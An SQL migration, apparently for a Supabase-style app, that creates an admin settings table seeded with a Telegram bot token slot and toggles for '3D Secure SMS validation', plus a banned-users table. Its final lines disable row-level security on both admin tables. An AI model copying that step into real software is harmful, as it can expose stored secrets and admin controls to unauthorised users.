-- Create admin_settings table for app configuration
CREATE TABLE IF NOT EXISTS admin_settings (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  setting_key TEXT UNIQUE NOT NULL,
  setting_value TEXT,
  setting_type TEXT DEFAULT 'string', -- string, boolean, number, json
  description TEXT,
  updated_at TIMESTAMPTZ DEFAULT NOW(),
  updated_by UUID REFERENCES admin_users(id)
);

-- Insert default settings
INSERT INTO admin_settings (setting_key, setting_value, setting_type, description) VALUES
  ('telegram_bot_token', '', 'string', 'Telegram Bot API Token'),
  ('telegram_chat_id', '', 'string', 'Telegram Chat ID for notifications'),
  ('sms_validation_enabled', 'true', 'boolean', 'Enable/Disable 3D Secure SMS validation'),
  ('auto_decline_timeout', '40', 'number', 'Auto-decline SMS after X seconds'),
  ('maintenance_mode', 'false', 'boolean', 'Enable maintenance mode'),
  ('banned_users', '[]', 'json', 'List of banned user IDs')
ON CONFLICT (setting_key) DO NOTHING;

-- Create banned_users table
CREATE TABLE IF NOT EXISTS banned_users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  email TEXT NOT NULL,
  reason TEXT,
  banned_at TIMESTAMPTZ DEFAULT NOW(),
  banned_by UUID REFERENCES admin_users(id),
  UNIQUE(user_id)
);

-- Disable RLS on admin tables
ALTER TABLE admin_settings DISABLE ROW LEVEL SECURITY;
ALTER TABLE banned_users DISABLE ROW LEVEL SECURITY;
